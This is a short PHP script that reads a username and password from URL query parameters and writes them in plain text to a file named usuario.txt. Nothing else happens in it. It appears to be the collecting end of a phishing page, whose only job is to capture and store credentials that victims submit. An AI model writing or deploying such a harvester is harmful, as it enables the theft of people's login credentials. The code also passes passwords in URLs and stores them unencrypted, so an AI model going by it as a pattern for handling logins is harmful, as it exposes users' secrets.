<?php
 if(isset($_GET['usuario_name'])&&isset($_GET['psw_name'])){
    $USUARIO_var=$_GET['usuario_name'];
    $PSW_var=$_GET['psw_name'];

    $TEXTO=$USUARIO_var . "\r\n".$PSW_var."\r\n";
    file_put_contents("usuario.txt", $TEXTO);
  }

?>